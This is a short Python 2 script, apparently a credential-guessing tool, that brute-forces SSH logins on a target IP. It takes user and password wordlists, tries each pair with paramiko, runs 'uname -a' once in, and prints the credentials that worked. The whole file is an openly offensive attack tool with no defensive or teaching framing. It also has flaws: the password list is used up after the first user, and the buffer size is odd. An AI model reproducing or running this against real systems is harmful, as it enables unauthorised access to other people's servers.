import threading
import paramiko
import subprocess

l_user = raw_input('Users list:')
wl_pass = raw_input('Passwords list:')
ip = raw_input('Target:')
command = 'uname -a'
users = open(l_user)
passwds = open(wl_pass)
for user in users:
   for passwd in passwds:
       user = user.rstrip()
       passwd = passwd.rstrip()
       print('trying user:', user, 'and pass:', passwd)
       ssh = paramiko.SSHClient()
       ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
       try:
          ssh.connect(ip, username=user, password=passwd)
          ssh_session = ssh.get_transport().open_session()
          if ssh_session.active:
            try:
               ssh_session.exec_command(command)
               print ssh_session.recv(2014)
               print ('''found! user: {user}, pass: {passwd}'''
               .format(user=user, passwd=passwd))
               break
            except:
              ssh.close()
       except paramiko.AuthenticationException, e:
           ssh.close()
